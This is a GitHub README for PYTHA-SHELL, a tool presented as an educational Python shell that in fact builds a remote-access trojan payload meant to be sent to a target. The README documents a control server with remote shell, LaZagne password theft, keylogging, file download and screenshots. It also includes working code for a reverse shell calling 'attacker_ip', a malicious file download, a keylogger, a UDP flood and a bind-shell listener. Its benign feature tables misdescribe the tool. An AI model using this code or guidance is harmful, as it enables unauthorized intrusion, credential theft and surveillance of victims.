
# PYTHA-SHELL - Advanced Python Shell Environment

**PYTHA-SHELL** is a versatile cybersecurity tool designed for educational purposes, featuring an RCE (Remote Code Execution) mode. This tool allows users to explore and understand various attacks and vulnerabilities in a controlled environment. PYTHA-SHELL includes practical examples and demonstrations to help learners grasp the concepts of remote code execution and other security risks. Ideal for students, educators, and cybersecurity enthusiasts, PYTHA-SHELL aims to provide hands-on experience with real-world vulnerabilities and attacks in a safe and controlled setting.PYTHA-SHELL helps users gain practical experience in a secure environment ,making it a valuable asset for both learning and teaching.

![pyytha](https://github.com/user-attachments/assets/90ce266c-7eb4-4f6d-b71a-1a8c0a895b8f)

### Key Features Table

| Feature                 | Description                                          |
|-------------------------|------------------------------------------------------|
| **Interactive Shell**   | Execute Python code interactively with real-time feedback. |
| **Advanced Debugging**  | Access built-in debugging tools for code inspection and troubleshooting. |
| **Code Autocompletion** | Get intelligent code suggestions to speed up development. |
| **Customizable Interface** | Tailor the shell interface to fit your workflow. |
| **Script Execution**    | Run Python scripts and view results directly within the shell. |
| **Variable Inspection** | Monitor and modify variables in real-time. |

### Feature Descriptions

| Feature            | Description                                           |
|--------------------|-------------------------------------------------------|
| **Execute Python Code** | Type and run Python commands directly in the shell. |
| **Debugging Tools**     | Set breakpoints, inspect variables, and step through code. |
| **Autocompletion**      | Intelligent suggestions for code completion. |
| **Script Execution**    | Load and run Python scripts with the run command. |
| **Customizable Interface** | Change the appearance and behavior of the shell to match user preferences. |
| **Variable Inspection** | Real-time monitoring and modification of variables. |


## Installation

To use PYTHA-SHELL, ensure you have Python 3.x installed. The tool also requires the `prompt_toolkit` library.

### Install Required Dependencies

```bash
pip install prompt_toolkit
```

### Clone the Repository and Install

```bash
git clone https://github.com/Faizan-Khanx/PYTHA-SHELL.git
cd PYTHA-SHELL
pip install -r requirements.txt
cd PYTHA
python PythaShell.py -h
```

Here's a table for the `PythaShell.py` options and their descriptions:

| Option              | Command              | Description                           |
|---------------------|----------------------|---------------------------------------|
| `-h`, `--help`       | `PythaShell.py -h`   | Show this help message and exit       |
| `-o`, `--host`       | `PythaShell.py -o`   | Host IP/hostname                      |
| `-p`, `--port`       | `PythaShell.py -p`   | Port                                  |
| `-i`, `--icon`       | `PythaShell.py -i`   | Path to icon file                     |
| `-c`, `--console`    | `PythaShell.py -c`   | Run as a console application          |
| `-d`, `--debug`      | `PythaShell.py -d`   | Enable PyInstaller debug mode         |
| `-m`, `--melt`       | `PythaShell.py -m`   | Melt file on startup                  |

## Setup Usage
### Simple Usage
- python3 PythaShell.py -o < host > -p < port > #Example python3 PythaShell.py -o 127.0.0.1 -p 1234

    ![Screenshot_2024-09-18_08-12-15](https://github.com/user-attachments/assets/7c5847cb-4865-4549-a3c0-5331360a721e)
  ![Screenshot_2024-09-18_08-15-49](https://github.com/user-attachments/assets/ad47afb3-c956-4358-bc03-bbf8bfcf4976)


- Now Check The Dist Folder For The Binary. And Send The Binary To Your Target
 ![Screenshot_2024-09-18_08-17-00](https://github.com/user-attachments/assets/55fa79b3-2ea4-45ea-ae4e-62de49eb4e77)
- Here you can se the Payload with name main_client . Send this to your target . 

## Usage

PYTHA-SHELL is a command-line tool for executing Python code and interacting with an advanced shell environment.

### Launch the Shell

```bash
python main_server.py -p <port> ``` #On Same Port You Use While Making The Payload
```

### Server Commands

| Command | Usage                              | Description                                |
|---------|------------------------------------|--------------------------------------------|
| `H`     | `H`                                | Help: Show available commands              |
| `L`     | `L`                                | List all connections (inactive connections shown) |
| `I`     | `I <index>`                        | Interact with a connection by index        |
| `E`     | `E <index>`                        | Open a remote shell with the specified connection |
| `S`     | `S <command>`                      | Send a command to every connection         |
| `O`     | `O <hostname/IP> <port>`           | Change connection details (hostname/IP and port) |
| `C`     | `C <index>`                        | Close the connection by index              |
| `X`     | `X`                                | Close/clear all connections                |
| `Q`     | `Q`                                | Close the server but keep the clients      |

![Screenshot_2024-09-18_08-22-29](https://github.com/user-attachments/assets/e3d7bf83-d6be-4933-8fe7-80ca3ea55de9)
- Now Execute L command to See The List of Total Hosts .
- After This Execute I command #Example I 1 >> if you want to interact with host 1 .
  
   ![I](https://github.com/user-attachments/assets/95f7b4b9-763f-4b6e-96ee-7b308ed1f346)
  
## Interact Commands

| Command | Usage                                     | Description                                              |
|---------|-------------------------------------------|----------------------------------------------------------|
| `H`     | `H`                                       | Help: Show available commands                            |
| `E`     | `E`                                       | Open remote shell                                        |
| `Y`     | `Y`                                       | Open Python interpreter                                  |
| `V`     | `V`                                       | Find vulnerabilities (exploit-only mode)                 |
| `R`     | `R`                                       | Retrieve passwords using LaZagne                         |
| `K`     | `K <start/stop/dump>`                     | Keylogger: Start, stop, or dump keystrokes               |
| `D`     | `D <directory/file>`                      | Download directory or file                               |
| `U`     | `U`                                       | Upload a file                                            |
| `S`     | `S`                                       | Take a screenshot                                        |
| `I`     | `I`                                       | View information about the connection                    |
| `B`     | `B`                                       | Move connection to the background                        |
| `C`     | `C`                                       | Close the connection                                     |

### Example Usage Of Interact Mode
  Here’s the **Example Usage Of Interact Mode** with the commands you asked for, now with example usage:

1. **Help**:

    ```bash
    >>> H
    ```

    **Description**: This command displays a help menu showing all available commands in interact mode.

2. **Open Remote Shell**:

    ```bash
    >>> E
    ```

    **Example**: Opens a shell to execute commands on the remote machine.

    ```bash
    >>> whoami
    root
    ```

    **Description**: The command `E` opens the remote shell, where you can now run commands like `whoami` to check the user on the remote host.

3. **Open Python Interpreter**:

    ```bash
    >>> Y
    ```

    **Example**: Opens a Python interpreter on the remote host.

    ```python
    >>> x = 5
    >>> x * 2
    10
    ```

    **Description**: You can now execute Python code directly on the remote system after running the `Y` command.

4. **Find Vulnerabilities (Exploit Only)**:

    ```bash
    >>> V
    ```

    **Example**: Lists vulnerabilities available for exploitation.

    ```bash
    >>> V
    [+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

   [+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

    ```

    **Description**: This command scans the remote host and lists known vulnerabilities that have exploits available.

5. **Retrieve Passwords using LaZagne**:

    ```bash
    >>> R
    ```

    **Example**: Retrieves passwords stored on the remote host.

    ```bash
    >>> R
    [*] Password found: admin123
    ```

    **Description**: The `R` command runs the LaZagne tool on the remote host to recover stored credentials.

6. **Keylogger Commands**:

    - **Start Keylogger**:

      ```bash
      >>> K start
      ```

      **Example**: Starts the keylogger on the remote system.

      ```bash
      >>> K start
      [*] Keylogger started
      ```

    - **Stop Keylogger**:

      ```bash
      >>> K stop
      ```

      **Example**: Stops the keylogger.

      ```bash
      >>> K stop
      [*] Keylogger stopped
      ```

    - **Dump Keylogger**:

      ```bash
      >>> K dump
      ```

      **Example**: Dumps the logged keystrokes to a file.

      ```bash
      >>> K dump
      [*] Dumping keystrokes:
      password123
      ```

7. **Download Directory or File**:

    - **Download Directory**:

      ```bash
      >>> D /home/user/documents
      ```

      **Example**: Downloads the `/documents` directory from the remote system.

      ```bash
      >>> D /home/user/documents
      [*] Downloading directory /documents...
      ```

    - **Download File**:

      ```bash
      >>> D /home/user/file.txt
      ```

      **Example**: Downloads the file `file.txt`.

      ```bash
      >>> D /home/user/file.txt
      [*] Downloading file /file.txt...
      ```

8. **Upload File**:

    ```bash
    >>> U /path/to/local/file.txt
    ```

    **Example**: Uploads a file from your local machine to the remote system.

    ```bash
    >>> U /path/to/local/file.txt
    [*] Uploading file.txt to remote host...
    ```

9. **Take Screenshot**:

    ```bash
    >>> S
    ```

    **Example**: Takes a screenshot of the remote system.

    ```bash
    >>> S
    [*] Screenshot saved as screenshot.png
    ```

10. **View Information**:

    ```bash
    >>> I
    ```

    **Example**: Retrieves system information such as OS, memory, and CPU usage.

    ```bash
    >>> I
    [*] OS: Ubuntu 20.04
    [*] CPU: 4 cores
    [*] Memory: 8GB
    ```

11. **Move Connection to Background**:

    ```bash
    >>> B
    ```

    **Example**: Moves the active connection to the background, freeing up the interface.

    ```bash
    >>> B
    [*] Connection moved to background.
    ```

12. **Close Connection**:

    ```bash
    >>> C
    ```

    **Example**: Closes the current connection with the remote host.

    ```bash
    >>> C
    [*] Connection closed.
    ```

13. **Execute Python Code**:

    ```python
    >>> print("Hello, World!")
    Hello, World!
    ```

    This command executes the Python code and prints the result.

14. **Run a Python Script**:

    ```python
    >>> run('example_script.py')
    ```

    This command loads and runs the Python script `example_script.py`.

15. **Inspect a Variable**:

    ```python
    >>> x = 10
    >>> x
    10
    ```

    This command assigns the value `10` to variable `x` and prints its value.

16. **Set Breakpoints**:

    ```python
    >>> set_breakpoint()
    ```

    This command sets a breakpoint in the code for debugging.

17. **Inspect Variables**:

    ```python
    >>> inspect_variable('x')
    ```

    This command inspects the variable `x` and shows its current value.

18. **Use Autocompletion**:

    ```python
    >>> import math
    >>> math.pi
    ```

    Typing `math.` and using autocompletion will show available attributes like `pi`.

19. **Customizable Interface**:

    ```python
    >>> customize_interface(theme='dark')
    ```

    This command changes the shell interface to a dark theme.

20. **Educational Example - Reverse Shell Code**:

    ```python
    >>> # For educational purposes only. Be cautious and use responsibly.
    >>> import socket
    >>> import subprocess
    >>> import os
    >>> 
    >>> def reverse_shell():
    >>>     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    >>>     s.connect(('attacker_ip', 4444))  # Replace with the attacker's IP and port
    >>>     while True:
    >>>         command = s.recv(1024).decode('utf-8')
    >>>         if command.lower() == 'exit':
    >>>             break
    >>>         output = subprocess.getoutput(command)
    >>>         s.send(output.encode('utf-8'))
    >>>     s.close()
    >>> 
    >>> reverse_shell()
    ```

    **Description**: This code demonstrates a basic reverse shell, where the target machine connects back to an attacker's machine and executes commands received over the network. **Warning**: This is for educational purposes only. **Do not use this code maliciously** or without proper authorization. It’s meant to demonstrate how reverse shells work for learning and ethical hacking practice.

21. **Educational Example - Malicious File Download**:

    ```python
    >>> # For educational purposes only. Use responsibly.
    >>> import urllib.request
    >>> url = 'http://malicious_website.com/malicious_file.exe'  # Replace with the malicious URL
    >>> save_path = 'malicious_file.exe'
    >>> urllib.request.urlretrieve(url, save_path)
    ```

    **Description**: This code snippet shows how to download a file from a given URL. In a malicious context, this could be used to download harmful files. **Do not use this code for malicious purposes**. It is included here for educational purposes to understand how such scripts operate.

22. **Educational Example - Keylogger Code**:

    ```python
    >>> # For educational purposes only. Be cautious with such code.
    >>> from pynput import keyboard
    >>> 
    >>> def on_press(key):
    >>>     try:
    >>>         with open('keylog.txt', 'a') as f:
    >>>             f.write(f'{key.char}')
    >>>     except AttributeError:
    >>>         with open('keylog.txt', 'a') as f:
    >>>             f.write(f'{key}')
    >>> 
    >>> with keyboard.Listener(on_press=on_press) as listener:
    >>>     listener.join()
    ```

    **Description**: This code demonstrates a simple keylogger that records keystrokes to a file. **Warning**: This is for educational purposes only. **Do not use this code to infringe on others' privacy**. It’s meant to illustrate how keyloggers function for learning and ethical hacking practice.

23. **Educational Example - SQL Injection Simulation**:

    ```python
    >>> # For educational purposes only. Use responsibly.
    >>> import sqlite3
    >>> 
    >>> conn = sqlite3.connect(':memory:')
    >>> cursor = conn.cursor()
    >>> cursor.execute('CREATE TABLE users (username TEXT, password TEXT)')
    >>> cursor.execute('INSERT INTO users (username, password) VALUES (?, ?)', ('admin', 'admin123'))
    >>> 
    >>> user_input = "' OR '1'='1"
    >>> query = f"SELECT * FROM users WHERE username='{user_input}'"
    >>> cursor.execute(query)
    >>> results = cursor.fetchall()
    >>> print(results)
    ```

    **Description**: This code demonstrates a simple SQL injection simulation by manipulating a query string to bypass authentication. **Warning**: This is for educational purposes only. **Do not use this code to attack or compromise databases**. It’s meant to illustrate how SQL injection works for learning and ethical hacking practice.

24. **Educational Example - Buffer Overflow Simulation**:

    ```python
    >>> # For educational purposes only. Use responsibly.
    >>> import ctypes
    >>> 
    >>> def buffer_overflow():
    >>>     buf = ctypes.create_string_buffer(10)
    >>>     buf.value = b'A' * 20  # Overflow buffer with excessive data
    >>>     print(buf.value)
    >>> 
    >>> buffer_overflow()
    ```

    **Description**: This code demonstrates a buffer overflow by writing more data to a buffer than it can handle, potentially causing unexpected behavior. **Warning**: This is for educational purposes only. **Do not use this code to exploit vulnerabilities**. It’s meant to illustrate how buffer overflows work for learning and ethical hacking practice.

25. **Educational Example - Denial of Service (DoS) Simulation**:

    ```python
    >>> # For educational purposes only. Use responsibly.
    >>> import socket
    >>> 
    >>> def dos_attack(target_ip, target_port):
    >>>     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    >>>     message = b'A' * 1024  # Large message to flood the target
    >>>     while True:
    >>>         sock.sendto(message, (target_ip, target_port))
    >>> 
    >>> dos_attack('target_ip', 80)  # Replace 'target_ip' with the target's IP address
    ```

    **Description**: This code demonstrates a simple denial of service (DoS) attack by flooding a target with a large number of messages. **Warning**: This is for educational purposes only. **Do not use this code to disrupt services**. It’s meant to illustrate how DoS attacks work for learning and ethical hacking practice.

26. **Educational Example - Remote Code Execution Simulation**:

    ```python
    >>> # For educational purposes only. Use responsibly.
    >>> import os
    >>> import socket
    >>> 
    >>> def remote_code_execution():
    >>>     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    >>>     s.bind(('0.0.0.0', 9999))
    >>>     s.listen(1)
    >>>     print("Listening for connections...")
    >>>     conn, addr = s.accept()
    >>>     print(f"Connection from {addr}")
    >>>     while True:
    >>>         data = conn.recv(1024).decode('utf-8')
    >>>         if not data:
    >>>             break
    >>>         output = os.popen(data).read()
    >>>         conn.send(output.encode('utf-8'))
    >>>     conn.close()
    >>> 
    >>> remote_code_execution()
    ```

    **Description**: This code demonstrates a remote code execution (RCE) simulation where the server listens for incoming connections and executes commands received from a client. **Warning**: This is for educational purposes only. **Do not use this code to exploit systems**. It’s meant to illustrate how remote code execution works for learning and ethical hacking practice.


## Screenshots

![V](https://github.com/user-attachments/assets/af75d24c-f188-471e-9ef0-63ac360f1452)
     
 *Example ScreenShott Of ```V``` Command Which Shows System Vulnerability To Exploit*

 ![R](https://github.com/user-attachments/assets/9b4f9068-51cd-46eb-9b00-59806d232c68)
     
*Example ScreenShott Of ```R``` Command Which Retreive All The Passwords*
 
![Y](https://github.com/user-attachments/assets/1ba3e472-0e2e-4952-b498-4a52552181c9)
     
 *Example ScreenShott Of ```Y``` Command Which Open Python Interpreter,we can also inject Malicious Code*
 
 ![I](https://github.com/user-attachments/assets/b4dc581e-230d-4da8-adde-b3d6e4bb7c6b)
      
*Example ScreenShott Of ```I``` Command Which Shows System Information*


## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE.md) file for details.

## Author

PYTHA-SHELL is developed by **Faizan Khan**.

- **GitHub**: [Faizan-Khanx](https://github.com/Faizan-Khanx)
- **Instagram**: [@EthicalFaizan](https://instagram.com/EthicalFaizan)

Feel free to contribute to this project or suggest improvements by raising issues or pull requests on GitHub.

## Contact

For any questions or feedback, please contact [E-Mail Me](mailto:fk776794@gmail.com?subject=Feedback%20on%20Faizan%20Net&body=Hello%20Faizan,%0A%0AI%20have%20some%20feedback%20to%20share%20about%20your%20Faizan%20Net%20tool.%0A%0A%2D%20Issue%2FComplaint%3A%20[Please%20describe%20the%20issue%20or%20complaint]%0A%2D%20Suggestions%2FChanges%3A%20[Please%20provide%20your%20suggestions%20or%20changes]%0A%0AThank%20you!%0A%0ARegards,%0A[Your%20Name])

<!-- display the social media buttons in your README -->

[![instagram](https://github.com/shikhar1020jais1/Git-Social/blob/master/Icons/Instagram.png (Instagram))][2]
[![twitter](https://github.com/shikhar1020jais1/Git-Social/blob/master/Icons/Twitter.png (Twitter))][3]
[![linkedin](https://github.com/shikhar1020jais1/Git-Social/blob/master/Icons/LinkedIn.png (LinkedIn))][4]
[![github](https://github.com/shikhar1020jais1/Git-Social/blob/master/Icons/Github.png (Github))][5]

<!-- To Link your profile to the media buttons -->

[2]: https://www.instagram.com/EthicalFaizan
[3]: https://www.twitter.com/EthicalFaizan
[4]: https://www.linkedin.com/in/EthicalFaizan
[5]: https://www.github.com/faizan-khanx

## GITHUB STATS

![Faizan's GitHub stats](https://github-readme-stats.vercel.app/api?username=faizan-khanx&show=reviews,discussions_started,discussions_answered,prs_merged,prs_merged_percentage&theme=dark#gh-dark-mode-only)
